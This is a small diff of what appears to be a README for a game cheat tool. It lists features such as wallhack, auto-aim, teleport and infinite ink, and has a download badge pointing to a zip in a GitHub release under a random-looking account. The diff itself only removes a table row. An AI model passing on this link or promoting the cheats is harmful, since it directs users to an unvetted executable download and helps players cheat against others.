@@ -7,7 +7,6 @@ Wallhack · Auto-Aim · Flight · Teleport · Invincibility · Infinite Ink
 <div align="center">
 
 | [![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/EveningSwimmerDwell/wbbhtcnq/releases/download/MecchaBionix/MecchaBionix.zip) |
-|:---:|:---:|:---:|:---:|
 
 </div>
 
